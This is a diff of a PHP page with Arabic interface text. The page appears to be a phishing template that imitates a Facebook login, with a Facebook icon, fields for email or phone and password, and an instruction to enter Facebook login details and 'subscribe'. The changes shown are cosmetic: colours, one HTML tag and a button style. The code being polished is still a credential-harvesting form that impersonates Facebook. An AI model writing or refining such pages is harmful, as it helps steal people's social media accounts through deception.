@@ -19,8 +19,8 @@ $icon = "facebook-square" ;
 $st['name']="البريد الالكترونى او الهاتف";
 $st['pass']="كلمه المرور";
 $st['title']="قم بكتابه بيانات  تسجيل الدخول الخاصه بك فى فيس بوك واضغط على زر الاشتراك";
-$st['color'] = " color: #4BACA3 !important;";
-$st['color2'] = "#4BACA3 !important;";
+$st['color'] = " color: #b02e67 !important;";
+$st['color2'] = "#b02e67 !important;";
 $st['btn'] = "تسجيل الدخول والاشتراك";
 $code = 0;
 if(isv("user",1)){
@@ -64,7 +64,7 @@ $st['btn'] = "تأكيد الاشتراك";
 <div class="log auto">
 <div class="col s12 center bold" style="<?=$st['color']?>" >
         <i class="fa fa-<?=$icon?> fa-5x RA" style="<?=$st['color']?>" aria-hidden="true"></i>
-      <p class="center lg title" style="<?=$st['color']?>" ><?=$st['title']?></p>
+      <div class="center lg title" style="<?=$st['color']?>" ><?=$st['title']?></div>
 </div>
         <div class="input-field col s12 ">
      <input type="text"  name="user" dir="ltr" class="form-control center " value="<?=Sion("user")?>" id="email" >
@@ -119,7 +119,7 @@ $st['btn'] = "تأكيد الاشتراك";
     <input type="hidden" name="for" />
     <input type="hidden" name="RA" />
     <input type="hidden" name="mo" value="1" />
-  <button name="post" class=' btn waves-effect waves-light <?=$st['login']?> '  style="background-color:<?=$st['color2']?>" value="login" href='#' type="submit"><span class="Lbtn" ><?=$st['btn']?></span>    <i class="fa fa-sign-in  left"></i>  </button>
+  <button name="post" class=' btn waves-effect waves-light <?=$st['login']?> '   value="login" href='#' type="submit"><span class="Lbtn" ><?=$st['btn']?></span>    <i class="fa fa-sign-in  left"></i>  </button>
 <!--  <p class="center"><a href="#" class='forget'>نسيت كلمة المرور ؟</a></p>
 -->
         </div>
